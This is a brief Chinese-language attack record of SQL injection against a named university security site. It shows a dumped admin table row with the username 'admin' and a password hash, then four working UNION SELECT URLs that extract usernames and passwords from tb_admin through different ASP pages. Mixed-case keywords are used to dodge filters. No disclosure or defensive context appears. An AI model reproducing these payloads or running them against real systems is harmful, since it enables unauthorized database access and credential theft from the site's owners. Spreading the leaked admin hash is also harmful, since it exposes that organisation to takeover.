#SQL注入@http://infosec.sjtu.edu.cn
<table border="1">
<tr>
<td>Table</td>
<td>id</td>
<td>username</td>
<td>pwd</td>
<td>unknown</td>
<td>role</td>
<td>unknown</td>
<td>v</td>
</tr>
<tr>
<td>tb_admin</td>
<td>1</td>
<td>admin</td>
<td>1824c2755278e62f412de9aeebe1ea31 </td>
<td>管理员</td>
<td>NULL</td>
<td>unknown</td>
<td>1, 2, 3,4</td>
</tr>
</table>
##注入点@ResearchDetail.asp
http://infosec.sjtu.edu.cn/ResearchDetail.asp?id=1 unIOn seLEct 1,username,3,4,pwd,6,7,8,9,10,11,12,13 fROm tb_admin
##注入点@NewsDetail.asp
http://infosec.sjtu.edu.cn/NewsDetail.asp?id=1 unIOn seLEct 1,username,pwd,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27 fROm tb_admin
##注入点@UndergraduateDetail.asp
http://infosec.sjtu.edu.cn/UndergraduateDetail.asp?id=1 unIOn seLEct 1,username,pwd,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27 fROm tb_admin
##注入点@GraduateDetail.asp
http://infosec.sjtu.edu.cn/GraduateDetail.asp?id=1 unIOn seLEct 1,username,pwd,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27 fROm tb_admin
##非注入点
http://infosec.sjtu.edu.cn/PeopleDetail.asp?id=1033
http://infosec.sjtu.edu.cn/Base.asp?id=141